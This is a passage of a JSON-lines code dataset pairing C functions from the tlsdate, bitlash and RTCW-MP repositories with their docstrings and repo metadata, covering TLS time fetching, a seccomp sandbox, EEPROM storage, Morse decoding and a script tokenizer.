verb(\"V: opening socket to %s:%s\", host, port);\n    if (0 != net_connect (&server_fd, host, atoi(port)))\n    {\n      die (\"SSL connection failed\");\n    }\n\n    ssl_set_bio (&ssl, net_recv, &server_fd, net_send, &server_fd);\n  }\n\n  verb(\"V: starting handshake\");\n  if (0 != ssl_do_handshake_part (&ssl))\n    die(\"SSL handshake first part failed\");\n\n  uint32_t timestamp = ( (uint32_t) ssl.in_msg[6] << 24 )\n                     | ( (uint32_t) ssl.in_msg[7] << 16 )\n                     | ( (uint32_t) ssl.in_msg[8] <<  8 )\n                     | ( (uint32_t) ssl.in_msg[9]       );\n  check_timestamp (timestamp);\n\n  verb(\"V: continuing handshake\");\n  /* Continue with handshake */\n  while (0 != (ret = ssl_handshake (&ssl)))\n  {\n    if (POLARSSL_ERR_NET_WANT_READ  != ret &&\n        POLARSSL_ERR_NET_WANT_WRITE != ret)\n    {\n      die(\"SSL handshake failed\");\n    }\n  }\n\n  // Verify the peer certificate against the CA certs on the local system\n  if (ca_racket) {\n    inspect_key (&ssl, hostname_to_verify);\n  } else {\n    verb (\"V: Certificate verification skipped!\");\n  }\n  check_key_length (&ssl);\n\n  memcpy (time_map, &timestamp, sizeof(uint32_t));\n  proxy_polarssl_free (&proxy_ctx);\n  ssl_free (&ssl);\n  x509_free (&cacert);\n}", "path": "src\\tlsdate-helper.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/** Return the proper commandline switches when the user needs information. */\n", "func_signal": "static void\nusage (void)", "code": "{\n  fprintf (stderr, \"tlsdate usage:\\n\"\n           \" [-h|--help]\\n\"\n           \" [-s|--skip-verification]\\n\"\n           \" [-n|--dont-set-clock]\\n\"\n           \" [-H|--host] [hostname|ip]\\n\"\n           \" [-p|--port] [port number]\\n\"\n           \" [-P|--protocol] [sslv23|sslv3|tlsv1]\\n\"\n           \" [-C|--certcontainer] [dirname|filename]\\n\"\n           \" [-v|--verbose]\\n\"\n           \" [-V|--showtime] [human|raw]\\n\"\n           \" [-t|--timewarp]\\n\"\n           \" [-l|--leap]\\n\"\n           \" [-x|--proxy] [url]\\n\"\n           \" [-w|--http]\\n\");\n}", "path": "src\\tlsdate.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/* Returns 0 if the the sandbox is enabled using\n * the time setter policy.\n */\n", "func_signal": "int\nenable_setter_seccomp (void)", "code": "{\n  static const struct sock_filter insns[] =\n  {\n    /* Ensure the syscall arch convention is as expected. */\n    BPF_STMT (BPF_LD+BPF_W+BPF_ABS,\n    offsetof (struct seccomp_data, arch)),\n    BPF_JUMP (BPF_JMP+BPF_JEQ+BPF_K, SECCOMP_AUDIT_ARCH, 1, 0),\n    BPF_STMT (BPF_RET+BPF_K, SECCOMP_FILTER_FAIL),\n    /* Load the syscall number for checking. */\n    BPF_STMT (BPF_LD+BPF_W+BPF_ABS,\n    offsetof (struct seccomp_data, nr)),\n\n    /* Process ALLOWs as quickly as possible */\n    SC_ALLOW (read),\n    SC_ALLOW (write),\n    SC_ALLOW (pwritev),\n\n    SC_ALLOW (settimeofday),\n    SC_ALLOW (ioctl), /* TODO(wad) filter for fd and RTC_SET_TIME */\n#ifdef __NR_time /* This is required for x86 systems */\n    SC_ALLOW (time),\n#endif\n\n    SC_ALLOW (lseek),\n    SC_ALLOW (close),\n    SC_ALLOW (munmap),\n\n    SC_ALLOW (exit_group),\n    SC_ALLOW (exit),\n\n    SC_DENY (open, EINVAL),\n    SC_DENY (fcntl, EINVAL),\n    SC_DENY (fstat, EINVAL),\n#ifdef __NR_mmap\n    SC_DENY (mmap, EINVAL),\n#endif\n#ifdef __NR_mmap2\n    SC_DENY (mmap2, EINVAL),\n#endif\n#ifdef __NR_sendto\n    SC_DENY (sendto, EINVAL),\n#endif\n#ifdef __NR_socket\n    SC_DENY (socket, EINVAL),\n#endif\n#ifdef __NR_socketcall\n    SC_DENY (socketcall, EINVAL),\n#endif\n    BPF_STMT (BPF_RET+BPF_K, SECCOMP_FILTER_FAIL),\n  };\n  static const struct sock_fprog prog =\n  {\n    .len = (unsigned short) (sizeof (insns) /sizeof (insns[0])),\n    .filter = (struct sock_filter *) insns,\n  };\n  return (prctl (PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) ||\n          prctl (PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog));\n}", "path": "src\\seccomp.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/**\n Search for a hostname match in the SubjectAlternativeNames.\n*/\n", "func_signal": "uint32_t\ncheck_san (SSL *ssl, const char *hostname)", "code": "{\n  X509 *cert;\n  int extcount, ok = 0;\n  /* What an OpenSSL mess ... */\n  if (NULL == (cert = SSL_get_peer_certificate(ssl)))\n  {\n    die (\"Getting certificate failed\");\n  }\n\n  if ((extcount = X509_get_ext_count(cert)) > 0)\n  {\n    int i;\n    for (i = 0; i < extcount; ++i)\n    {\n      const char *extstr;\n      X509_EXTENSION *ext;\n      ext = X509_get_ext(cert, i);\n      extstr = OBJ_nid2sn(OBJ_obj2nid(X509_EXTENSION_get_object(ext)));\n\n      if (!strcmp(extstr, \"subjectAltName\"))\n      {\n\n        int j;\n        void *extvalstr;\n        const unsigned char *tmp;\n\n        STACK_OF(CONF_VALUE) *val;\n        CONF_VALUE *nval;\n#if OPENSSL_VERSION_NUMBER >= 0x10000000L\n        const\n#endif\n        X509V3_EXT_METHOD *method;\n\n        if (!(method = X509V3_EXT_get(ext)))\n        {\n          break;\n        }\n\n        tmp = ext->value->data;\n        if (method->it)\n        {\n          extvalstr = ASN1_item_d2i(NULL, &tmp, ext->value->length,\n                                    ASN1_ITEM_ptr(method->it));\n        } else {\n          extvalstr = method->d2i(NULL, &tmp, ext->value->length);\n        }\n\n        if (!extvalstr)\n        {\n          break;\n        }\n\n        if (method->i2v)\n        {\n          val = method->i2v(method, extvalstr, NULL);\n          for (j = 0; j < sk_CONF_VALUE_num(val); ++j)\n          {\n            nval = sk_CONF_VALUE_value(val, j);\n            if ((!strcasecmp(nval->name, \"DNS\") &&\n                !strcasecmp(nval->value, hostname) ) ||\n                (!strcasecmp(nval->name, \"iPAddress\") &&\n                !strcasecmp(nval->value, hostname)))\n            {\n              verb (\"V: subjectAltName matched: %s, type: %s\", nval->value, nval->name); // We matched this; so it's safe to print\n              ok = 1;\n              break;\n            }\n            // Attempt to match subjectAltName DNS names\n            if (!strcasecmp(nval->name, \"DNS\"))\n            {\n              ok = check_wildcard_match_rfc2595(hostname, nval->value);\n              if (ok)\n              {\n                break;\n              }\n            }\n            verb_debug (\"V: subjectAltName found but not matched: %s, type: %s\",\n                nval->value, sanitize_string(nval->name));\n          }\n        }\n      } else {\n        verb_debug (\"V: found non subjectAltName extension\");\n      }\n      if (ok)\n      {\n        break;\n      }\n    }\n  } else {\n    verb_debug (\"V: no X509_EXTENSION field(s) found\");\n  }\n  X509_free(cert);\n  return ok;\n}", "path": "src\\tlsdate-helper.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/**\n * Set current real time clock using time.\n *\n * @param time where the current time to set is stored\n * @return clock_settime syscall return value\n */\n", "func_signal": "int clock_set_real_time(const struct tlsdate_time *time)", "code": "{\n  /* Safety net */\n  assert (time);\n  return clock_settime (CLOCK_REALTIME, &time->tp);\n}", "path": "src\\compat\\clock-linux.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/**\n * Init a tlsdate_time structure.\n *\n * @param sec is the seconds\n * @param nsec is the nanoseconds\n */\n", "func_signal": "void clock_init_time(struct tlsdate_time *time, time_t sec,\n                           long nsec)", "code": "{\n  /* Safety net */\n  assert (time);\n  time->tp.tv_sec = sec;\n  time->tp.tv_nsec = nsec;\n}", "path": "src\\compat\\clock-linux.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "/** helper function for 'free' */\n", "func_signal": "static void\nxfree (void *ptr)", "code": "{\n  if (NULL == ptr)\n    die(\"xfree: NULL pointer given as argument\");\n\n  free(ptr);\n}", "path": "src\\tlsdate-helper.c", "repo_name": "ioerror/tlsdate", "stars": 355, "license": "other", "language": "c", "size": 2723}
{"docstring": "//////////\n//\n// show_user_functions: display a list of registered user functions\n//\n", "func_signal": "void show_user_functions(void)", "code": "{\nbyte i;\n\tfor (i=0; i < bf_install_count; i++) {\n\t\tsp(user_functions[i].name);\n\t\tspb(' ');\n\t}\n\tspeol();\n}", "path": "src\\bitlash-functions.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "/////////////////////////\n//\tEndWord: watch for end of word timeout\n//\n", "func_signal": "void morse_endword(byte keyDown)", "code": "{\n\ttone_off();\n\n#define SEND_SPACE_AFTER_WORD_TIMEOUT 0\n#if SEND_SPACE_AFTER_WORD_TIMEOUT\n\t// on timeout we print a blank to separate words\n\tif (dt > (5 * morse_dit_ms)) {\n\t\techoChar(' ');\n\t\tmorseSetState(morse_idle);\n\t}\n\n\t// if we see a keydown we bug out and let the experts handle it\n\telse if (keyDown) morseSetState(morse_idle);\n#else\n\t// sometimes we don't want the word break behavior\n\t// in that case, we bug out to idle right away\n\tmorseSetState(morse_idle);\n#endif\n\t\n}", "path": "examples\\morse2\\doc\\morseio.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// return true iff script exists\n", "func_signal": "byte scriptfileexists(char *scriptname)", "code": "{\n\tFILE *file;\n\tif ((file = fopen(scriptname, \"r\")) == NULL) return 0;\n\tfclose(file);\n\treturn 1;\n}", "path": "src\\bitlash-unix-file.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// Look up an entry by key.  Returns -1 on fail else addr of value.\n", "func_signal": "int getValue(char *key)", "code": "{\n\tint kaddr = findKey(key);\n\treturn (kaddr < 0) ? kaddr : findend(kaddr);\n}", "path": "src\\bitlash-eeprom.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// find an entry in the db; return offset of id or FAIL\n", "func_signal": "int findKey(char *id)", "code": "{\nint start = STARTDB;\n\twhile (start < ENDDB-4) {\n\t\t// find the next entry\n\t\tstart = findoccupied(start);\n\t\tif (start == FAIL) return FAIL;\n\n\t\t// start points to EEPROM id - check for match with id\t\t\n\t\tif (eestrmatch(start, id)) return start;\n\n\t\t// no match - skip the id and its value and continue scanning\n\t\tstart = findend(start);\t\t// scan past id\n\t\tstart = findend(start);\t\t// and value\n\t}\n\treturn FAIL;\n}", "path": "src\\bitlash-eeprom.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// return the address of the first unused space at or after addr\n", "func_signal": "int findunoccupied(int addr)", "code": "{\n\twhile (addr < ENDDB) {\n\t\tif (eeread(addr) == EMPTY) return addr;\n\t\taddr++;\n\t}\n\treturn FAIL;\n}", "path": "src\\bitlash-eeprom.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// Send the current character\n// todo: insert into serial buffer\n//\n", "func_signal": "void emitChar(void)", "code": "{\nbyte i;\nbyte c;\n\tif (element_count < 6) {\n\t\tc = (element_count << 5) | element_bits;\n\t\tfor (i = 0; i < 64; i++) {\n\t\t\tif (pgm_read_byte(morsetab + i) == c) {\n\t\t\t\techoChar((char) i + 0x20);\n\t\t\t\tstartChar();\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\t//if (i >= 64) echoChar('?');\n\t}\n\telse {\n\t\tfor (i=0; i < NUM_SPECIAL_CHARS; i++) {\n\t\t\tif (element_bits == pgm_read_byte(m6codes + i)) {\n\t\t\t\techoChar(pgm_read_byte(outliers + i));\n\t\t\t\tstartChar();\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\t//if (i >= 7) echoChar('@');\n\t}\n\n\t// we get here if we can't match the input pattern\n\t// todo: bogus character handling\n\tstartChar();\n}", "path": "examples\\morse2\\doc\\morseio.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// return true if string in EEPROM at addr matches string at str\n", "func_signal": "char eestrmatch(int addr, char *str)", "code": "{\n\twhile (*str) if (eeread(addr++) != *str++) return 0;\n\tif (eeread(addr) == 0) return 1;\t// ended at the same place?\n\treturn 0;\n}", "path": "src\\bitlash-eeprom.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// scan from addr for an occupied byte\n", "func_signal": "int findoccupied(int addr)", "code": "{\n\twhile (addr < ENDDB) {\n\t\tif (eeread(addr) != EMPTY) return addr;\n\t\taddr++;\n\t}\n\treturn FAIL;\n}", "path": "src\\bitlash-eeprom.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "//////////\n//\n//\trunBackgroundTasks\n//\n//\tRuns one eligible background task per invocation\n//\tReturns true if a task was run\n//\n", "func_signal": "void runBackgroundTasks(void)", "code": "{\nbyte i;\t\n\n#ifdef suspendBackground\n\tif (suspendBackground) return;\n#endif\n\n\tfor (i=0; i<NUMTASKS; i++) {\n\t\t// run one task per call on a round robin basis\n\t\tif (++curtask >= NUMTASKS) curtask = 0;\n\t\tif ((tasklist[curtask] != SLOT_FREE) && \n\t\t\t(((signed long) millis() - (signed long) waketime[curtask])) >= 0) {\n\n\t\t\t// run it with the background flag set\n\t\t\tbackground = 1;\n\t\t\texecscript(SCRIPT_EEPROM, findend(tasklist[curtask]), 0);\n\n\t\t\t// schedule the next time quantum for this task\n\t\t\twaketime[curtask] = millis() + snoozetime[curtask];\n\t\t\tbackground = 0;\n\t\t\tbreak;\n\t\t}\n\t}\n}", "path": "src\\bitlash-taskmgr.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// list the strings in the avpdb\n", "func_signal": "void cmd_ls(void)", "code": "{\nint start = STARTDB;\n\tfor (;;) {\n\t\t// find the next entry\n\t\tstart = findoccupied(start);\n\t\tif (start == FAIL) return;\n\n\t\tmsgp(M_function);\n\t\tspb(' ');\n\t\teeputs(start);\n\t\tspb(' ');\n\t\tspb('{');\n\t\tstart = findend(start);\n\t\teeputs(start);\n\t\tspb('}');\n\t\tspb(';');\n\t\tspeol();\n\t\tstart = findend(start);\n\t}\n}", "path": "src\\bitlash-eeprom.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// print eeprom string at addr\n", "func_signal": "void eeputs(int addr)", "code": "{\n\tfor (;;) {\n\t\tbyte c = eeread(addr++);\n\t\tif (!c || (c == EMPTY)) return;\n#if 0\n\t\t//else if (c == '\"') { spb('\\\\'); spb('\"'); }\n\t\telse if (c == '\\\\') { spb('\\\\'); spb('\\\\'); }\n\t\telse if (c == '\\n') { spb('\\\\'); spb('n'); }\n\t\telse if (c == '\\t') { spb('\\\\'); spb('t'); }\n\t\telse if (c == '\\r') { spb('\\\\'); spb('r'); }\n\t\telse if ((c >= 0x80) || (c < ' ')) {\n\t\t\tspb('\\\\'); spb('x'); \n\t\t\tif (c < 0x10) spb('0'); printHex(c);\n\t\t}\n#endif\n\t\telse spb(c);\n\t}\n}", "path": "src\\bitlash-eeprom.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "///////////////////\n// This must be called in loop(), frequently, to run the state machine\n//\n", "func_signal": "void runMorse(byte keyDown)", "code": "{\n\tif (millis() > endmorseSnooze) {\n\t\tdt = millis() - t_state_start;\n\t\t(*statefunc)(keyDown);\n\t}\n}", "path": "examples\\morse2\\doc\\morseio.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// erase entry by id\n", "func_signal": "void eraseentry(char *id)", "code": "{\n\tint entry = findKey(id);\n\tif (entry >= 0) erasestr(erasestr(entry));\n}", "path": "src\\bitlash-eeprom.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "//////////////////////////\n// Test driver\n//\n", "func_signal": "void setup(void)", "code": "{\n\tSerial.begin(115200);\n\n\t// set up lcd\n\tpinMode(LCD_PIN, OUTPUT);\n\tlcd.begin(LCD_BAUD);\n\t\n\tSerial.println(\"Morse input codec test here!\");\n\tinitMorse();\n\tdigitalWrite(6,1);\t// engage pullup\n\tdigitalWrite(15,1);\n\n\ttone_init_morse();\n\tsendMorseString(\"ok\");\n}", "path": "examples\\morse2\\doc\\morseio.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "/////////////////////////////////////////\n// memory mapped port io: inb() and outb()\n//\n//\tsee the table of register addresses on page 203 of the Tiny85 spec\n//\tit is necessary to add 0x20 to the address in the \"register\" column\n//\tto get the proper mapped address for the register\n//\t\tthus: TCCR0B assigned 0x33 is accesssible at 0x53\n//\t\t>print inb(0x53)\n//\t\t2\n//\n", "func_signal": "numvar func_inb(void)", "code": "{ reqargs(1); return *(volatile byte *) arg1; }\nnumvar func_outb(void) { reqargs(2); *(volatile byte *) arg1 = (byte) arg2; return 0;}\nnumvar func_abs(void) { reqargs(1); return arg1 < 0 ? -arg1 : arg1; }\nnumvar func_sign(void) {\n\treqargs(1);\n\tif (arg1 < 0) return -1;\n\tif (arg1 > 0) return 1;\n\treturn 0;\n}", "path": "src\\bitlash-functions.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// Save string at str to EEPROM at addr\n", "func_signal": "void saveString(int addr, char *str)", "code": "{\n\twhile (*str) eewrite(addr++, *str++);\n\teewrite(addr, 0);\n}", "path": "src\\bitlash-eeprom.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "////////////////////////////\n// Idle: look for start of character\n//\n", "func_signal": "void morse_idle(byte keyDown)", "code": "{\n\ttone_off();\n\tif (keyDown) {\n\t\tif (++keyDownCount < KEY_DOWN_COUNT) morseSnooze(KEY_DEBOUNCE_TIMEOUT);\n\t\telse {\n\t\t\tstartChar();\t// start up in not-idle mode\n\n#if INCLUDE_IAMBIC\n\t\t\tmorseSetState(iambic ? morse_iambic_keydown : morse_keydown);\n#else\n\t\t\tmorseSetState(morse_keydown);\n#endif\n\t\t}\n\t}\n\telse keyDownCount = 0;\n}", "path": "examples\\morse2\\doc\\morseio.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "/////////////////////////\n// KeyUp: Handle end-element\n//\n", "func_signal": "void morse_keyup(byte keyDown)", "code": "{\n\ttone_off();\n\tif (keyDown) {\t\t\t\t// keyDown within 3 dit times: this char continues\n\t\tif (++keyDownCount < KEY_DOWN_COUNT) morseSnooze(KEY_DEBOUNCE_TIMEOUT);\n\t\telse {\n\t\t\tif (dt > (2 * morse_dit_ms)) emitChar();\n\t\t\tmorseSetState(morse_keydown);\n\t\t}\n\t}\n\telse {\t\t\t\t\t\t// key still up: check char timeout\n\t\tkeyDownCount = 0;\n\t\tif (dt > (3 * morse_dit_ms)) {\t// it was a char break\n\t\t\temitChar();\n\t\t\tmorseSetState(morse_endword);\n\t\t}\n\t}\n}", "path": "examples\\morse2\\doc\\morseio.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "// seed the random number generator\n", "func_signal": "void dbseed(uint32_t x)", "code": "{\n\tdeadbeef_seed = x;\n\tdeadbeef_beef = 0xdeadbeef;\n}", "path": "src\\bitlash-functions.c", "repo_name": "billroy/bitlash", "stars": 340, "license": "mit", "language": "c", "size": 7769}
{"docstring": "//end of the function PS_ReadPunctuation\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "int PS_ReadPrimitive( script_t *script, token_t *token )", "code": "{\n\tint len;\n\n\tlen = 0;\n\twhile ( *script->script_p > ' ' && *script->script_p != ';' )\n\t{\n\t\tif ( len >= MAX_TOKEN ) {\n\t\t\tScriptError( script, \"primitive token longer than MAX_TOKEN = %d\", MAX_TOKEN );\n\t\t\treturn 0;\n\t\t} //end if\n\t\ttoken->string[len++] = *script->script_p++;\n\t} //end while\n\ttoken->string[len] = 0;\n\t//copy the token into the script structure\n\tmemcpy( &script->token, token, sizeof( token_t ) );\n\t//primitive reading successfull\n\treturn 1;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function ScriptError\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void QDECL ScriptWarning( script_t *script, char *str, ... )", "code": "{\n\tchar text[1024];\n\tva_list ap;\n\n\tif ( script->flags & SCFL_NOWARNINGS ) {\n\t\treturn;\n\t}\n\n\tva_start( ap, str );\n\tvsprintf( text, str, ap );\n\tva_end( ap );\n#ifdef BOTLIB\n\tbotimport.Print( PRT_WARNING, \"file %s, line %d: %s\\n\", script->filename, script->line, text );\n#endif //BOTLIB\n#ifdef MEQCC\n\tprintf( \"warning: file %s, line %d: %s\\n\", script->filename, script->line, text );\n#endif //MEQCC\n#ifdef BSPC\n\tLog_Print( \"warning: file %s, line %d: %s\\n\", script->filename, script->line, text );\n#endif //BSPC\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function NumLinesCrossed\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "int ScriptSkipTo( script_t *script, char *value )", "code": "{\n\tint len;\n\tchar firstchar;\n\n\tfirstchar = *value;\n\tlen = strlen( value );\n\tdo\n\t{\n\t\tif ( !PS_ReadWhiteSpace( script ) ) {\n\t\t\treturn 0;\n\t\t}\n\t\tif ( *script->script_p == firstchar ) {\n\t\t\tif ( !strncmp( script->script_p, value, len ) ) {\n\t\t\t\treturn 1;\n\t\t\t} //end if\n\t\t} //end if\n\t\tscript->script_p++;\n\t} while ( 1 );\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function GetScriptFlags\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "void ResetScript( script_t *script )", "code": "{\n\t//pointer in script buffer\n\tscript->script_p = script->buffer;\n\t//pointer in script buffer before reading token\n\tscript->lastscript_p = script->buffer;\n\t//begin of white space\n\tscript->whitespace_p = NULL;\n\t//end of white space\n\tscript->endwhitespace_p = NULL;\n\t//set if there's a token available in script->token\n\tscript->tokenavailable = 0;\n\t//\n\tscript->line = 1;\n\tscript->lastline = 1;\n\t//clear the saved token\n\tmemset( &script->token, 0, sizeof( token_t ) );\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function PS_ExpectTokenType\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "int PS_ExpectAnyToken( script_t *script, token_t *token )", "code": "{\n\tif ( !PS_ReadToken( script, token ) ) {\n\t\tScriptError( script, \"couldn't read expected token\" );\n\t\treturn 0;\n\t} //end if\n\telse\n\t{\n\t\treturn 1;\n\t} //end else\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function PunctuationFromNum\n//===========================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//===========================================================================\n", "func_signal": "void QDECL ScriptError( script_t *script, char *str, ... )", "code": "{\n\tchar text[1024];\n\tva_list ap;\n\n\tif ( script->flags & SCFL_NOERRORS ) {\n\t\treturn;\n\t}\n\n\tva_start( ap, str );\n\tvsprintf( text, str, ap );\n\tva_end( ap );\n#ifdef BOTLIB\n\tbotimport.Print( PRT_ERROR, \"file %s, line %d: %s\\n\", script->filename, script->line, text );\n#endif //BOTLIB\n#ifdef MEQCC\n\tprintf( \"error: file %s, line %d: %s\\n\", script->filename, script->line, text );\n#endif //MEQCC\n#ifdef BSPC\n\tLog_Print( \"error: file %s, line %d: %s\\n\", script->filename, script->line, text );\n#endif //BSPC\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
{"docstring": "//end of the function NumberValue\n//============================================================================\n//\n// Parameter:\t\t\t\t-\n// Returns:\t\t\t\t\t-\n// Changes Globals:\t\t-\n//============================================================================\n", "func_signal": "int PS_ReadNumber( script_t *script, token_t *token )", "code": "{\n\tint len = 0, i;\n\tint octal, dot;\n\tchar c;\n//\tunsigned long int intvalue = 0;\n//\tlong double floatvalue = 0;\n\n\ttoken->type = TT_NUMBER;\n\t//check for a hexadecimal number\n\tif ( *script->script_p == '0' &&\n\t\t ( *( script->script_p + 1 ) == 'x' ||\n\t\t   *( script->script_p + 1 ) == 'X' ) ) {\n\t\ttoken->string[len++] = *script->script_p++;\n\t\ttoken->string[len++] = *script->script_p++;\n\t\tc = *script->script_p;\n\t\t//hexadecimal\n\t\twhile ( ( c >= '0' && c <= '9' ) ||\n\t\t\t\t( c >= 'a' && c <= 'f' ) ||\n\t\t\t\t( c >= 'A' && c <= 'A' ) )\n\t\t{\n\t\t\ttoken->string[len++] = *script->script_p++;\n\t\t\tif ( len >= MAX_TOKEN ) {\n\t\t\t\tScriptError( script, \"hexadecimal number longer than MAX_TOKEN = %d\", MAX_TOKEN );\n\t\t\t\treturn 0;\n\t\t\t} //end if\n\t\t\tc = *script->script_p;\n\t\t} //end while\n\t\ttoken->subtype |= TT_HEX;\n\t} //end if\n#ifdef BINARYNUMBERS\n\t//check for a binary number\n\telse if ( *script->script_p == '0' &&\n\t\t\t  ( *( script->script_p + 1 ) == 'b' ||\n\t\t\t\t*( script->script_p + 1 ) == 'B' ) ) {\n\t\ttoken->string[len++] = *script->script_p++;\n\t\ttoken->string[len++] = *script->script_p++;\n\t\tc = *script->script_p;\n\t\t//hexadecimal\n\t\twhile ( c == '0' || c == '1' )\n\t\t{\n\t\t\ttoken->string[len++] = *script->script_p++;\n\t\t\tif ( len >= MAX_TOKEN ) {\n\t\t\t\tScriptError( script, \"binary number longer than MAX_TOKEN = %d\", MAX_TOKEN );\n\t\t\t\treturn 0;\n\t\t\t} //end if\n\t\t\tc = *script->script_p;\n\t\t} //end while\n\t\ttoken->subtype |= TT_BINARY;\n\t} //end if\n#endif //BINARYNUMBERS\n\telse //decimal or octal integer or floating point number\n\t{\n\t\toctal = qfalse;\n\t\tdot = qfalse;\n\t\tif ( *script->script_p == '0' ) {\n\t\t\toctal = qtrue;\n\t\t}\n\t\twhile ( 1 )\n\t\t{\n\t\t\tc = *script->script_p;\n\t\t\tif ( c == '.' ) {\n\t\t\t\tdot = qtrue;\n\t\t\t} else if ( c == '8' || c == '9' ) {\n\t\t\t\toctal = qfalse;\n\t\t\t} else if ( c < '0' || c > '9' )                                              {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\ttoken->string[len++] = *script->script_p++;\n\t\t\tif ( len >= MAX_TOKEN - 1 ) {\n\t\t\t\tScriptError( script, \"number longer than MAX_TOKEN = %d\", MAX_TOKEN );\n\t\t\t\treturn 0;\n\t\t\t} //end if\n\t\t} //end while\n\t\tif ( octal ) {\n\t\t\ttoken->subtype |= TT_OCTAL;\n\t\t} else { token->subtype |= TT_DECIMAL;}\n\t\tif ( dot ) {\n\t\t\ttoken->subtype |= TT_FLOAT;\n\t\t}\n\t} //end else\n\tfor ( i = 0; i < 2; i++ )\n\t{\n\t\tc = *script->script_p;\n\t\t//check for a LONG number\n\t\tif ( ( c == 'l' || c == 'L' ) &&\n\t\t\t !( token->subtype & TT_LONG ) ) {\n\t\t\tscript->script_p++;\n\t\t\ttoken->subtype |= TT_LONG;\n\t\t} //end if\n\t\t  //check for an UNSIGNED number\n\t\telse if ( ( c == 'u' || c == 'U' ) &&\n\t\t\t\t  !( token->subtype & ( TT_UNSIGNED | TT_FLOAT ) ) ) {\n\t\t\tscript->script_p++;\n\t\t\ttoken->subtype |= TT_UNSIGNED;\n\t\t} //end if\n\t} //end for\n\ttoken->string[len] = '\\0';\n#ifdef NUMBERVALUE\n\tNumberValue( token->string, token->subtype, &token->intvalue, &token->floatvalue );\n#endif //NUMBERVALUE\n\tif ( !( token->subtype & TT_FLOAT ) ) {\n\t\ttoken->subtype |= TT_INTEGER;\n\t}\n\treturn 1;\n}", "path": "src\\botlib\\l_script.c", "repo_name": "id-Software/RTCW-MP", "stars": 314, "license": "gpl-3.0", "language": "c", "size": 2784}
